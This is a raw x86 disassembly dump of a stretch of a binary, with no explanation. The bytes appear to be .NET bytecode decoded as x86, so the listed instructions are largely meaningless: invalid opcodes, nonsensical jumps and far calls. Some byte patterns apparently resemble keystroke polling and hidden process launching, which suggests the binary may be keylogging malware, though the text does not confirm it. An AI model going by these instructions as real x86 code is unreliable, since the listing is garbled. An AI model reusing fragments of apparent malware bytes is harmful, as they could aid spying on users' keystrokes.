  404760:	d6                   	salc
  404761:	00 00                	add    %al,(%eax)
  404763:	0a 74 85 00          	or     0x0(%ebp,%eax,4),%dh
  404767:	00 01                	add    %al,(%ecx)
  404769:	0a 06                	or     (%esi),%al
  40476b:	7e 31                	jle    0x40479e
  40476d:	00 00                	add    %al,(%eax)
  40476f:	04 73                	add    $0x73,%al
  404771:	40                   	inc    %eax
  404772:	00 00                	add    %al,(%eax)
  404774:	0a 7e 31             	or     0x31(%esi),%bh
  404777:	00 00                	add    %al,(%eax)
  404779:	04 8e                	add    $0x8e,%al
  40477b:	b7 6f                	mov    $0x6f,%bh
  40477d:	45                   	inc    %ebp
  40477e:	00 00                	add    %al,(%eax)
  404780:	0a 9a 6f d7 00 00    	or     0xd76f(%edx),%bl
  404786:	0a 06                	or     (%esi),%al
  404788:	17                   	pop    %ss
  404789:	6f                   	outsl  %ds:(%esi),(%dx)
  40478a:	d8 00                	fadds  (%eax)
  40478c:	00 0a                	add    %cl,(%edx)
  40478e:	06                   	push   %es
  40478f:	20 10                	and    %dl,(%eax)
  404791:	27                   	daa
  404792:	00 00                	add    %al,(%eax)
  404794:	6f                   	outsl  %ds:(%esi),(%dx)
  404795:	d9 00                	flds   (%eax)
  404797:	00 0a                	add    %cl,(%edx)
  404799:	06                   	push   %es
  40479a:	72 d5                	jb     0x404771
  40479c:	15 00 70 6f da       	adc    $0xda6f7000,%eax
  4047a1:	00 00                	add    %al,(%eax)
  4047a3:	0a 06                	or     (%esi),%al
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	db 00                	fildl  (%eax)
  4047a8:	00 0a                	add    %cl,(%edx)
  4047aa:	74 86                	je     0x404732
  4047ac:	00 00                	add    %al,(%eax)
  4047ae:	01 0b                	add    %ecx,(%ebx)
  4047b0:	de 0a                	fimuls (%edx)
  4047b2:	07                   	pop    %es
  4047b3:	2c 06                	sub    $0x6,%al
  4047b5:	07                   	pop    %es
  4047b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b7:	6d                   	insl   (%dx),%es:(%edi)
  4047b8:	00 00                	add    %al,(%eax)
  4047ba:	0a dc                	or     %ah,%bl
  4047bc:	2b 07                	sub    (%edi),%eax
  4047be:	02 28                	add    (%eax),%ch
  4047c0:	a0 00 00 0a 26       	mov    0x260a0000,%al
  4047c5:	2a 00                	sub    (%eax),%al
  4047c7:	00 01                	add    %al,(%ecx)
  4047c9:	1c 00                	sbb    $0x0,%al
  4047cb:	00 00                	add    %al,(%eax)
  4047cd:	00 06                	add    %al,(%esi)
  4047cf:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  4047d2:	00 0c 32             	add    %cl,(%edx,%esi,1)
  4047d5:	00 00                	add    %al,(%eax)
  4047d7:	01 02                	add    %eax,(%edx)
  4047d9:	00 80 00 02 82 00    	add    %al,0x820200(%eax)
  4047df:	0a 00                	or     (%eax),%al
  4047e1:	00 00                	add    %al,(%eax)
  4047e3:	00 1b                	add    %bl,(%ebx)
  4047e5:	30 05 00 40 00 00    	xor    %al,0x4000
  4047eb:	00 21                	add    %ah,(%ecx)
  4047ed:	00 00                	add    %al,(%eax)
  4047ef:	11 16                	adc    %edx,(%esi)
  4047f1:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  4047f4:	07                   	pop    %es
  4047f5:	b5 1f                	mov    $0x1f,%ch
  4047f7:	64 28 dc             	fs sub %bl,%ah
  4047fa:	00 00                	add    %al,(%eax)
  4047fc:	0a 13                	or     (%ebx),%dl
  4047fe:	04 12                	add    $0x12,%al
  404800:	04 1f                	add    $0x1f,%al
  404802:	64 12 02             	adc    %fs:(%edx),%al
  404805:	1f                   	pop    %ds
  404806:	64 28 7f 00          	sub    %bh,%fs:0x0(%edi)
  40480a:	00 06                	add    %al,(%esi)
  40480c:	2c 04                	sub    $0x4,%al
  40480e:	17                   	pop    %ss
  40480f:	0a de                	or     %dh,%bl
  404811:	1c 07                	sbb    $0x7,%al
  404813:	17                   	pop    %ss
  404814:	d6                   	salc
  404815:	0b 07                	or     (%edi),%eax
  404817:	1a 31                	sbb    (%ecx),%dh
  404819:	d8 de                	fcomp  %st(6)
  40481b:	0e                   	push   %cs
  40481c:	25 28 2e 00 00       	and    $0x2e28,%eax
  404821:	0a 0d 28 30 00 00    	or     0x3028,%cl
  404827:	0a de                	or     %dh,%bl
  404829:	00 16                	add    %dl,(%esi)
  40482b:	0a 2b                	or     (%ebx),%ch
  40482d:	00 06                	add    %al,(%esi)
  40482f:	2a 01                	sub    (%ecx),%al
  404831:	10 00                	adc    %al,(%eax)
  404833:	00 00                	add    %al,(%eax)
  404835:	00 00                	add    %al,(%eax)
  404837:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  40483a:	00 0e                	add    %cl,(%esi)
  40483c:	32 00                	xor    (%eax),%al
  40483e:	00 01                	add    %al,(%ecx)
  404840:	13 30                	adc    (%eax),%esi
  404842:	09 00                	or     %eax,(%eax)
  404844:	c8 00 00 00          	enter  $0x0,$0x0
  404848:	22 00                	and    (%eax),%al
  40484a:	00 11                	add    %dl,(%ecx)
  40484c:	28 9c 00 00 0a 1c 28 	sub    %bl,0x281c0a00(%eax,%eax,1)
  404853:	fd                   	std
  404854:	00 00                	add    %al,(%eax)
  404856:	06                   	push   %es
  404857:	02 28                	add    (%eax),%ch
  404859:	2b 00                	sub    (%eax),%eax
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	28 9d 00 00 0a 0a    	sub    %bl,0xa0a0000(%ebp)
  404863:	06                   	push   %es
  404864:	28 2d 00 00 0a 03    	sub    %ch,0x30a0000
  40486a:	28 dd                	sub    %bl,%ch
  40486c:	00 00                	add    %al,(%eax)
  40486e:	0a 20                	or     (%eax),%ah
  404870:	f4                   	hlt
  404871:	01 00                	add    %eax,(%eax)
  404873:	00 28                	add    %ch,(%eax)
  404875:	2c 00                	sub    $0x0,%al
  404877:	00 0a                	add    %cl,(%edx)
  404879:	02 6f d2             	add    -0x2e(%edi),%ch
  40487c:	00 00                	add    %al,(%eax)
  40487e:	0a 72 dd             	or     -0x23(%edx),%dh
  404881:	15 00 70 6f de       	adc    $0xde6f7000,%eax
  404886:	00 00                	add    %al,(%eax)
  404888:	0a 2c 3b             	or     (%ebx,%edi,1),%ch
  40488b:	72 c1                	jb     0x40484e
  40488d:	02 00                	add    (%eax),%al
  40488f:	70 73                	jo     0x404904
  404891:	df 00                	filds  (%eax)
  404893:	00 0a                	add    %cl,(%edx)
  404895:	0c 08                	or     $0x8,%al
  404897:	17                   	pop    %ss
  404898:	6f                   	outsl  %ds:(%esi),(%dx)
  404899:	38 00                	cmp    %al,(%eax)
  40489b:	00 0a                	add    %cl,(%edx)
  40489d:	08 72 e7             	or     %dh,-0x19(%edx)
  4048a0:	15 00 70 06 28       	adc    $0x28067000,%eax
  4048a5:	75 00                	jne    0x4048a7
  4048a7:	00 0a                	add    %cl,(%edx)
  4048a9:	72 27                	jb     0x4048d2
  4048ab:	16                   	push   %ss
  4048ac:	00 70 28             	add    %dh,0x28(%eax)
  4048af:	75 00                	jne    0x4048b1
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	28 2d 00 00 0a 6f    	sub    %ch,0x6f0a0000
  4048b9:	3a 00                	cmp    (%eax),%al
  4048bb:	00 0a                	add    %cl,(%edx)
  4048bd:	08 28                	or     %ch,(%eax)
  4048bf:	3b 00                	cmp    (%eax),%eax
  4048c1:	00 0a                	add    %cl,(%edx)
  4048c3:	0b 2b                	or     (%ebx),%ebp
  4048c5:	4d                   	dec    %ebp
  4048c6:	14 d0                	adc    $0xd0,%al
  4048c8:	39 00                	cmp    %eax,(%eax)
  4048ca:	00 01                	add    %al,(%ecx)
  4048cc:	28 25 00 00 0a 72    	sub    %ah,0x720a0000
  4048d2:	a1 06 00 70 17       	mov    0x17700006,%eax
  4048d7:	8d 03                	lea    (%ebx),%eax
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	01 0d 09 16 06 28    	add    %ecx,0x28061609
  4048e1:	22 00                	and    (%eax),%al
  4048e3:	00 0a                	add    %cl,(%edx)
  4048e5:	a2 09 13 04 11       	mov    %al,0x11041309
  4048ea:	04 14                	add    $0x14,%al
  4048ec:	14 17                	adc    $0x17,%al
  4048ee:	8d 48 00             	lea    0x0(%eax),%ecx
  4048f1:	00 01                	add    %al,(%ecx)
  4048f3:	13 05 11 05 16 17    	adc    0x17160511,%eax
  4048f9:	9c                   	pushf
  4048fa:	11 05 17 28 87 00    	adc    %eax,0x872817
  404900:	00 0a                	add    %cl,(%edx)
  404902:	26 11 05 16 90 2c 0a 	adc    %eax,%es:0xa2c9016
  404909:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40490c:	9a 28 22 00 00 0a 0a 	lcall  $0xa0a,$0x2228
  404913:	2a 1b                	sub    (%ebx),%bl
  404915:	30 03                	xor    %al,(%ebx)
  404917:	00 5d 00             	add    %bl,0x0(%ebp)
  40491a:	00 00                	add    %al,(%eax)
  40491c:	23 00                	and    (%eax),%eax
  40491e:	00 11                	add    %dl,(%ecx)
  404920:	28 bd 00 00 0a 02    	sub    %bh,0x20a0000(%ebp)
  404926:	6f                   	outsl  %ds:(%esi),(%dx)
  404927:	be 00 00 0a 0b       	mov    $0xb0a0000,%esi
  40492c:	07                   	pop    %es
  40492d:	6f                   	outsl  %ds:(%esi),(%dx)
  40492e:	e0 00                	loopne 0x404930
  404930:	00 0a                	add    %cl,(%edx)
  404932:	0d 07 09 6f c0       	or     $0xc06f0907,%eax
  404937:	00 00                	add    %al,(%eax)
  404939:	0a 6f e1             	or     -0x1f(%edi),%ch
  40493c:	00 00                	add    %al,(%eax)
  40493e:	0a 28                	or     (%eax),%ch
  404940:	22 00                	and    (%eax),%al
  404942:	00 0a                	add    %cl,(%edx)
  404944:	0c 17                	or     $0x17,%al
  404946:	8d 03                	lea    (%ebx),%eax
  404948:	00 00                	add    %al,(%eax)
  40494a:	01 13                	add    %edx,(%ebx)
  40494c:	04 09                	add    $0x9,%al
  40494e:	6f                   	outsl  %ds:(%esi),(%dx)
  40494f:	e2 00                	loop   0x404951
  404951:	00 0a                	add    %cl,(%edx)
  404953:	8e b7 16 33 03 14    	mov    0x14033316(%edi),%?
  404959:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40495c:	08 28                	or     %ch,(%eax)
  40495e:	22 00                	and    (%eax),%al
  404960:	00 0a                	add    %cl,(%edx)
  404962:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404965:	e3 00                	jecxz  0x404967
  404967:	00 0a                	add    %cl,(%edx)
  404969:	26 de 0f             	fimuls %es:(%edi)
  40496c:	25 28 2e 00 00       	and    $0x2e28,%eax
  404971:	0a 13                	or     (%ebx),%dl
  404973:	05 28 30 00 00       	add    $0x3028,%eax
  404978:	0a de                	or     %dh,%bl
  40497a:	00 06                	add    %al,(%esi)
  40497c:	2a 00                	sub    (%eax),%al
  40497e:	00 00                	add    %al,(%eax)
  404980:	01 10                	add    %edx,(%eax)
  404982:	00 00                	add    %al,(%eax)
  404984:	00 00                	add    %al,(%eax)
  404986:	00 00                	add    %al,(%eax)
  404988:	4c                   	dec    %esp
  404989:	4c                   	dec    %esp
  40498a:	00 0f                	add    %cl,(%edi)
  40498c:	32 00                	xor    (%eax),%al
  40498e:	00 01                	add    %al,(%ecx)
  404990:	1b 30                	sbb    (%eax),%esi
  404992:	05 00 aa 00 00       	add    $0xaa00,%eax
  404997:	00 24 00             	add    %ah,(%eax,%eax,1)
  40499a:	00 11                	add    %dl,(%ecx)
  40499c:	18 17                	sbb    %dl,(%edi)
  40499e:	1c 73                	sbb    $0x73,%al
  4049a0:	48                   	dec    %eax
  4049a1:	00 00                	add    %al,(%eax)
  4049a3:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4049a6:	02 7b 20             	add    0x20(%ebx),%bh
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	04 02                	add    $0x2,%al
  4049ad:	7b 21                	jnp    0x4049d0
  4049af:	00 00                	add    %al,(%eax)
  4049b1:	04 28                	add    $0x28,%al
  4049b3:	c4 00                	les    (%eax),%eax
  4049b5:	00 0a                	add    %cl,(%edx)
  4049b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4049b8:	4d                   	dec    %ebp
  4049b9:	00 00                	add    %al,(%eax)
  4049bb:	0a 1b                	or     (%ebx),%bl
  4049bd:	8d 31                	lea    (%ecx),%esi
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	01 13                	add    %edx,(%ebx)
  4049c3:	04 11                	add    $0x11,%al
  4049c5:	04 16                	add    $0x16,%al
  4049c7:	72 c9                	jb     0x404992
  4049c9:	20 00                	and    %al,(%eax)
  4049cb:	70 a2                	jo     0x40496f
  4049cd:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4049d0:	02 7b 20             	add    0x20(%ebx),%bh
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	04 a2                	add    $0xa2,%al
  4049d7:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  4049da:	72 f9                	jb     0x4049d5
  4049dc:	20 00                	and    %al,(%eax)
  4049de:	70 a2                	jo     0x404982
  4049e0:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  4049e3:	7e 31                	jle    0x404a16
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	04 73                	add    $0x73,%al
  4049e9:	40                   	inc    %eax
  4049ea:	00 00                	add    %al,(%eax)
  4049ec:	0a 7e 31             	or     0x31(%esi),%bh
  4049ef:	00 00                	add    %al,(%eax)
  4049f1:	04 8e                	add    $0x8e,%al
  4049f3:	b7 6f                	mov    $0x6f,%bh
  4049f5:	45                   	inc    %ebp
  4049f6:	00 00                	add    %al,(%eax)
  4049f8:	0a 9a a2 11 04 1a    	or     0x1a0411a2(%edx),%bl
  4049fe:	72 aa                	jb     0x4049aa
  404a00:	21 00                	and    %eax,(%eax)
  404a02:	70 a2                	jo     0x4049a6
  404a04:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404a07:	94                   	xchg   %eax,%esp
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	0a 0b                	or     (%ebx),%cl
  404a0c:	28 e4                	sub    %ah,%ah
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	0a 07                	or     (%edi),%al
  404a12:	6f                   	outsl  %ds:(%esi),(%dx)
  404a13:	e5 00                	in     $0x0,%eax
  404a15:	00 0a                	add    %cl,(%edx)
  404a17:	0a 08                	or     (%eax),%cl
  404a19:	06                   	push   %es
  404a1a:	16                   	push   %ss
  404a1b:	06                   	push   %es
  404a1c:	8e b7 16 6f e6 00    	mov    0xe66f16(%edi),%?
  404a22:	00 0a                	add    %cl,(%edx)
  404a24:	26 20 c4             	es and %al,%ah
  404a27:	09 00                	or     %eax,(%eax)
  404a29:	00 28                	add    %ch,(%eax)
  404a2b:	2c 00                	sub    $0x0,%al
  404a2d:	00 0a                	add    %cl,(%edx)
  404a2f:	08 6f 92             	or     %ch,-0x6e(%edi)
  404a32:	00 00                	add    %al,(%eax)
  404a34:	0a de                	or     %dh,%bl
  404a36:	0e                   	push   %cs
  404a37:	25 28 2e 00 00       	and    $0x2e28,%eax
  404a3c:	0a 0d 28 30 00 00    	or     0x3028,%cl
  404a42:	0a de                	or     %dh,%bl
  404a44:	00 2a                	add    %ch,(%edx)
  404a46:	00 00                	add    %al,(%eax)
  404a48:	01 10                	add    %edx,(%eax)
  404a4a:	00 00                	add    %al,(%eax)
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	9b                   	fwait
  404a51:	9b                   	fwait
  404a52:	00 0e                	add    %cl,(%esi)
  404a54:	32 00                	xor    (%eax),%al
  404a56:	00 01                	add    %al,(%ecx)
  404a58:	1b 30                	sbb    (%eax),%esi
  404a5a:	04 00                	add    $0x0,%al
  404a5c:	3a 01                	cmp    (%ecx),%al
  404a5e:	00 00                	add    %al,(%eax)
  404a60:	25 00 00 11 02       	and    $0x2110000,%eax
  404a65:	2c 2f                	sub    $0x2f,%al
  404a67:	28 9c 00 00 0a 1c 28 	sub    %bl,0x281c0a00(%eax,%eax,1)
  404a6e:	fd                   	std
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	06                   	push   %es
  404a72:	03 28                	add    (%eax),%ebp
  404a74:	2b 00                	sub    (%eax),%eax
  404a76:	00 0a                	add    %cl,(%edx)
  404a78:	28 9d 00 00 0a 10    	sub    %bl,0x100a0000(%ebp)
  404a7e:	01 03                	add    %eax,(%ebx)
  404a80:	04 28                	add    $0x28,%al
  404a82:	dd 00                	fldl   (%eax)
  404a84:	00 0a                	add    %cl,(%edx)
  404a86:	de 0e                	fimuls (%esi)
  404a88:	25 28 2e 00 00       	and    $0x2e28,%eax
  404a8d:	0a 0a                	or     (%edx),%cl
  404a8f:	28 30                	sub    %dh,(%eax)
  404a91:	00 00                	add    %al,(%eax)
  404a93:	0a de                	or     %dh,%bl
  404a95:	00 28                	add    %ch,(%eax)
  404a97:	e9 00 00 06 28       	jmp    0x28464a9c
  404a9c:	e7 00                	out    %eax,$0x0
  404a9e:	00 0a                	add    %cl,(%edx)
  404aa0:	72 e0                	jb     0x404a82
  404aa2:	21 00                	and    %eax,(%eax)
  404aa4:	70 28                	jo     0x404ace
  404aa6:	2b 00                	sub    (%eax),%eax
  404aa8:	00 0a                	add    %cl,(%edx)
  404aaa:	0b 07                	or     (%edi),%eax
  404aac:	73 e8                	jae    0x404a96
  404aae:	00 00                	add    %al,(%eax)
  404ab0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404ab3:	72 ea                	jb     0x404a9f
  404ab5:	21 00                	and    %eax,(%eax)
  404ab7:	70 6f                	jo     0x404b28
  404ab9:	e9 00 00 0a 08       	jmp    0x84a4abe
  404abe:	72 fe                	jb     0x404abe
  404ac0:	21 00                	and    %eax,(%eax)
  404ac2:	70 6f                	jo     0x404b33
  404ac4:	e9 00 00 0a 08       	jmp    0x84a4ac9
  404ac9:	72 1e                	jb     0x404ae9
  404acb:	22 00                	and    (%eax),%al
  404acd:	70 28                	jo     0x404af7
  404acf:	ea 00 00 0a 28 2b 00 	ljmp   $0x2b,$0x280a0000
  404ad6:	00 0a                	add    %cl,(%edx)
  404ad8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ad9:	e9 00 00 0a 08       	jmp    0x84a4ade
  404ade:	72 26                	jb     0x404b06
  404ae0:	22 00                	and    (%eax),%al
  404ae2:	70 28                	jo     0x404b0c
  404ae4:	eb 00                	jmp    0x404ae6
  404ae6:	00 0a                	add    %cl,(%edx)
  404ae8:	28 5f 00             	sub    %bl,0x0(%edi)
  404aeb:	00 0a                	add    %cl,(%edx)
  404aed:	72 32                	jb     0x404b21
  404aef:	22 00                	and    (%eax),%al
  404af1:	70 28                	jo     0x404b1b
  404af3:	39 00                	cmp    %eax,(%eax)
  404af5:	00 0a                	add    %cl,(%edx)
  404af7:	6f                   	outsl  %ds:(%esi),(%dx)
  404af8:	e9 00 00 0a 08       	jmp    0x84a4afd
  404afd:	72 1e                	jb     0x404b1d
  404aff:	22 00                	and    (%eax),%al
  404b01:	70 28                	jo     0x404b2b
  404b03:	9c                   	pushf
  404b04:	00 00                	add    %al,(%eax)
  404b06:	0a 28                	or     (%eax),%ch
  404b08:	2b 00                	sub    (%eax),%eax
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404b0d:	e9 00 00 0a 08       	jmp    0x84a4b12
  404b12:	72 26                	jb     0x404b3a
  404b14:	22 00                	and    (%eax),%al
  404b16:	70 07                	jo     0x404b1f
  404b18:	28 5f 00             	sub    %bl,0x0(%edi)
  404b1b:	00 0a                	add    %cl,(%edx)
  404b1d:	72 32                	jb     0x404b51
  404b1f:	22 00                	and    (%eax),%al
  404b21:	70 28                	jo     0x404b4b
  404b23:	39 00                	cmp    %eax,(%eax)
  404b25:	00 0a                	add    %cl,(%edx)
  404b27:	6f                   	outsl  %ds:(%esi),(%dx)
  404b28:	e9 00 00 0a de       	jmp    0xde4a4b2d
  404b2d:	0a 08                	or     (%eax),%cl
  404b2f:	2c 06                	sub    $0x6,%al
  404b31:	08 6f 6d             	or     %ch,0x6d(%edi)
  404b34:	00 00                	add    %al,(%eax)
  404b36:	0a dc                	or     %ah,%bl
  404b38:	02 2c 15 03 28 a0 00 	add    0xa02803(,%edx,1),%ch
  404b3f:	00 0a                	add    %cl,(%edx)
  404b41:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  404b45:	2e 00 00             	add    %al,%cs:(%eax)
  404b48:	0a 28                	or     (%eax),%ch
  404b4a:	30 00                	xor    %al,(%eax)
  404b4c:	00 0a                	add    %cl,(%edx)
  404b4e:	de 00                	fiadds (%eax)
  404b50:	73 36                	jae    0x404b88
  404b52:	00 00                	add    %al,(%eax)
  404b54:	0a 13                	or     (%ebx),%dl
  404b56:	04 11                	add    $0x11,%al
  404b58:	04 07                	add    $0x7,%al
  404b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b5b:	37                   	aaa
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	0a 11                	or     (%ecx),%dl
  404b60:	04 17                	add    $0x17,%al
  404b62:	6f                   	outsl  %ds:(%esi),(%dx)
  404b63:	ec                   	in     (%dx),%al
  404b64:	00 00                	add    %al,(%eax)
  404b66:	0a 11                	or     (%ecx),%dl
  404b68:	04 16                	add    $0x16,%al
  404b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b6b:	ed                   	in     (%dx),%eax
  404b6c:	00 00                	add    %al,(%eax)
  404b6e:	0a 11                	or     (%ecx),%dl
  404b70:	04 16                	add    $0x16,%al
  404b72:	6f                   	outsl  %ds:(%esi),(%dx)
  404b73:	ee                   	out    %al,(%dx)
  404b74:	00 00                	add    %al,(%eax)
  404b76:	0a 11                	or     (%ecx),%dl
  404b78:	04 17                	add    $0x17,%al
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	38 00                	cmp    %al,(%eax)
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404b82:	3b 00                	cmp    (%eax),%eax
  404b84:	00 0a                	add    %cl,(%edx)
  404b86:	26 16                	es push %ss
  404b88:	28 2f                	sub    %ch,(%edi)
  404b8a:	00 00                	add    %al,(%eax)
  404b8c:	0a de                	or     %dh,%bl
  404b8e:	0e                   	push   %cs
  404b8f:	25 28 2e 00 00       	and    $0x2e28,%eax
  404b94:	0a 0d 28 30 00 00    	or     0x3028,%cl
  404b9a:	0a de                	or     %dh,%bl
  404b9c:	00 2a                	add    %ch,(%edx)
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	01 34 00             	add    %esi,(%eax,%eax,1)
  404ba3:	00 00                	add    %al,(%eax)
  404ba5:	00 03                	add    %al,(%ebx)
  404ba7:	00 21                	add    %ah,(%ecx)
  404ba9:	24 00                	and    $0x0,%al
  404bab:	0e                   	push   %cs
  404bac:	32 00                	xor    (%eax),%al
  404bae:	00 01                	add    %al,(%ecx)
  404bb0:	02 00                	add    (%eax),%al
  404bb2:	4e                   	dec    %esi
  404bb3:	00 7c ca 00          	add    %bh,0x0(%edx,%ecx,8)
  404bb7:	0a 00                	or     (%eax),%al
  404bb9:	00 00                	add    %al,(%eax)
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	00 d7                	add    %dl,%bh
  404bbf:	00 09                	add    %cl,(%ecx)
  404bc1:	e0 00                	loopne 0x404bc3
  404bc3:	0c 32                	or     $0x32,%al
  404bc5:	00 00                	add    %al,(%eax)
  404bc7:	01 00                	add    %eax,(%eax)
  404bc9:	00 37                	add    %dh,(%edi)
  404bcb:	00 f4                	add    %dh,%ah
  404bcd:	2b 01                	sub    (%ecx),%eax
  404bcf:	0e                   	push   %cs
  404bd0:	32 00                	xor    (%eax),%al
  404bd2:	00 01                	add    %al,(%ecx)
  404bd4:	1b 30                	sbb    (%eax),%esi
  404bd6:	04 00                	add    $0x0,%al
  404bd8:	2e 00 00             	add    %al,%cs:(%eax)
  404bdb:	00 26                	add    %ah,(%esi)
  404bdd:	00 00                	add    %al,(%eax)
  404bdf:	11 28                	adc    %ebp,(%eax)
  404be1:	3d 00 00 0a 0b       	cmp    $0xb0a0000,%eax
  404be6:	7e 26                	jle    0x404c0e
  404be8:	00 00                	add    %al,(%eax)
  404bea:	04 02                	add    $0x2,%al
  404bec:	07                   	pop    %es
  404bed:	6f                   	outsl  %ds:(%esi),(%dx)
  404bee:	f1                   	int1
  404bef:	00 00                	add    %al,(%eax)
  404bf1:	0a 28                	or     (%eax),%ch
  404bf3:	b5 00                	mov    $0x0,%ch
  404bf5:	00 06                	add    %al,(%esi)
  404bf7:	16                   	push   %ss
  404bf8:	28 b2 00 00 06 0a    	sub    %dh,0xa060000(%edx)
  404bfe:	de 0c de             	fimuls (%esi,%ebx,8)
  404c01:	0a 07                	or     (%edi),%al
  404c03:	2c 06                	sub    $0x6,%al
  404c05:	07                   	pop    %es
  404c06:	6f                   	outsl  %ds:(%esi),(%dx)
  404c07:	6d                   	insl   (%dx),%es:(%edi)
  404c08:	00 00                	add    %al,(%eax)
  404c0a:	0a dc                	or     %ah,%bl
  404c0c:	06                   	push   %es
  404c0d:	2a 00                	sub    (%eax),%al
  404c0f:	00 01                	add    %al,(%ecx)
  404c11:	10 00                	adc    %al,(%eax)
  404c13:	00 02                	add    %al,(%edx)
  404c15:	00 06                	add    %al,(%esi)
  404c17:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  404c1a:	00 0a                	add    %cl,(%edx)
  404c1c:	00 00                	add    %al,(%eax)
  404c1e:	00 00                	add    %al,(%eax)
  404c20:	1b 30                	sbb    (%eax),%esi
  404c22:	07                   	pop    %es
  404c23:	00 d9                	add    %bl,%cl
  404c25:	02 00                	add    (%eax),%al
  404c27:	00 27                	add    %ah,(%edi)
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	11 02                	adc    %eax,(%edx)
  404c2d:	16                   	push   %ss
  404c2e:	3f                   	aas
  404c2f:	c0 02 00             	rolb   $0x0,(%edx)
  404c32:	00 03                	add    %al,(%ebx)
  404c34:	20 00                	and    %al,(%eax)
  404c36:	01 00                	add    %eax,(%eax)
  404c38:	00 28                	add    %ch,(%eax)
  404c3a:	f2 00 00             	repnz add %al,(%eax)
  404c3d:	0a 28                	or     (%eax),%ch
  404c3f:	f3 00 00             	repz add %al,(%eax)
  404c42:	0a 39                	or     (%ecx),%bh
  404c44:	ab                   	stos   %eax,%es:(%edi)
  404c45:	02 00                	add    (%eax),%al
  404c47:	00 04 28             	add    %al,(%eax,%ebp,1)
  404c4a:	f4                   	hlt
  404c4b:	00 00                	add    %al,(%eax)
  404c4d:	0a 8c 7f 00 00 01 13 	or     0x13010000(%edi,%edi,2),%cl
  404c54:	04 1f                	add    $0x1f,%al
  404c56:	14 28                	adc    $0x28,%al
  404c58:	b8 00 00 06 20       	mov    $0x20060000,%eax
  404c5d:	ff                   	(bad)
  404c5e:	ff 00                	incl   (%eax)
  404c60:	00 5f 16             	add    %bl,0x16(%edi)
  404c63:	fe 01                	incb   (%ecx)
  404c65:	16                   	push   %ss
  404c66:	fe 01                	incb   (%ecx)
  404c68:	8c 48 00             	mov    %cs,0x0(%eax)
  404c6b:	00 01                	add    %al,(%ecx)
  404c6d:	0b 20                	or     (%eax),%esp
  404c6f:	a0 00 00 00 28       	mov    0x28000000,%al
  404c74:	b8 00 00 06 20       	mov    $0x20060000,%eax
  404c79:	00 80 00 00 5f 16    	add    %al,0x165f0000(%eax)
  404c7f:	33 16                	xor    (%esi),%edx
  404c81:	20 a1 00 00 00 28    	and    %ah,0x28000000(%ecx)
  404c87:	b8 00 00 06 20       	mov    $0x20060000,%eax
  404c8c:	00 80 00 00 5f 16    	add    %al,0x165f0000(%eax)
  404c92:	33 03                	xor    (%ebx),%eax
  404c94:	16                   	push   %ss
  404c95:	2b 01                	sub    (%ecx),%eax
  404c97:	17                   	pop    %ss
  404c98:	8c 48 00             	mov    %cs,0x0(%eax)
  404c9b:	00 01                	add    %al,(%ecx)
  404c9d:	0d 11 04 28 f5       	or     $0xf5280411,%eax
  404ca2:	00 00                	add    %al,(%eax)
  404ca4:	0a 28                	or     (%eax),%ch
  404ca6:	b0 00                	mov    $0x0,%al
  404ca8:	00 06                	add    %al,(%esi)
  404caa:	0c 07                	or     $0x7,%al
  404cac:	28 f6                	sub    %dh,%dh
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	0a 2d 10 09 28 f6    	or     0xf6280910,%ch
  404cb6:	00 00                	add    %al,(%eax)
  404cb8:	0a 2d 08 16 8c 48    	or     0x488c1608,%ch
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	01 2b                	add    %ebp,(%ebx)
  404cc2:	06                   	push   %es
  404cc3:	17                   	pop    %ss
  404cc4:	8c 48 00             	mov    %cs,0x0(%eax)
  404cc7:	00 01                	add    %al,(%ecx)
  404cc9:	28 f6                	sub    %dh,%dh
  404ccb:	00 00                	add    %al,(%eax)
  404ccd:	0a 2c 1d 08 14 72 d2 	or     -0x2d8debf8(,%ebx,1),%ch
  404cd4:	22 00                	and    (%eax),%al
  404cd6:	70 16                	jo     0x404cee
  404cd8:	8d 03                	lea    (%ebx),%eax
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	01 14 14             	add    %edx,(%esp,%edx,1)
  404cdf:	14 28                	adc    $0x28,%al
  404ce1:	c2 00 00             	ret    $0x0
  404ce4:	0a 28                	or     (%eax),%ch
  404ce6:	22 00                	and    (%eax),%al
  404ce8:	00 0a                	add    %cl,(%edx)
  404cea:	0c 2b                	or     $0x2b,%al
